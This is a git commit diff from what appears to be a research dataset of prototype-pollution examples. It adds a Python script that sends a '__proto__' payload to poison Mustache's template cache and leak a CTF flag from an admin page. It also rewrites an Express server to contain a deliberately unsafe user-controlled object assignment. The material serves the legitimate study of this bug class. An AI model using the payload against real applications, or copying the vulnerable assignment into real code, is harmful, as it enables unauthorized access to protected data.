ec70696f71543cacb93e52822a0e53aec165e37f
kccarlos <kccarlos.an@gmail.com>
2022-12-01 11:44:20 -0500

    Update to include the PP process

--- dataset/exps/mustaches.py
+++ dataset/exps/mustaches.py
@@ -5,5 +5,20 @@ import os
 HOST = os.getenv("HOST", "localhost")
 PORT = os.getenv("PORT", 8002)
 
+
+# Step 1: Object.prototype[<mustache cache>] = <fake template token>
+with open("../ppexamples/mustache/views/admin.html", "r") as f:
+    template = f.read()
+
+cache_key = template + ":{{:}}"
+cache_val = [["name", "flag", 0, 100]]
+r = requests.post(f"http://{HOST}:{PORT}/edit",
+                  headers={"Content-Type": "application/json"},
+                  data=json.dumps({"ip": "__proto__",
+                                   "index": cache_key,
+                                   "memo": cache_val}))
+print('Complete PP, response: ', r.text)
+
+# Step 2: Trigger the rendering / cache lookup
 r = requests.get(f"http://{HOST}:{PORT}/admin")
 print(r.text)
--- dataset/ppexamples/mustache-simplified/server.js
+++ dataset/ppexamples/mustache-simplified/server.js
@@ -15,14 +15,26 @@ app.set('views', path.join(__dirname, 'views'));
 app.set('view engine', 'html');
 app.use(express.json());
 
-let index = "<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <link rel=\"stylesheet\" href=\"https://cdn.simplecss.org/simple.min.css\">\n        <title>Admin Panel - lolpanda</title>\n    </head>\n    <body>\n        <header>\n            <h1>Admin Panel</h1>\n            <p>Please leave this page if you're not the admin.</p>\n        </header>\n        <main>\n            <article style=\"text-align: center;\">\n                <h2>FLAG</h2>\n                <p>\n                    {{#is_admin}}\n                    FLAG: <code>{{flag}}</code>\n                    {{/is_admin}}\n                    {{^is_admin}}\n                    <mark>Access Denied</mark>\n                    {{/is_admin}}\n                </p>\n            </article>\n        </main>\n    </body>\n</html>\n:{{:}}"
-Object.prototype[index] = [["name", "this_is_flag", 0, 100]];
+let memo = {};
 const FLAG = "FakeCTF{panda-sensei}";
+
+/** Edit memo */
+app.post('/edit', (req, res) => {
+    let ip = req.ip;
+    let index = req.body.index;
+    let new_memo = req.body.memo;
+
+    /* Admin can edit anyone's memo for censorship */
+    ip = req.body.ip;
+
+    /* Update memo */
+    memo[ip][index] = new_memo;
+    res.json({status: 'success', result: 'Successfully updated'});
+});
 
 /** Admin panel */
 app.get('/admin', (req, res) => {
-    res.render('admin', {is_admin:false, this_is_flag:FLAG});
-    // res.render(mustache.render(content.toString(), options))
+    res.render('admin', {is_admin:false, flag:FLAG});
 });
 
 app.listen(3000, () => {
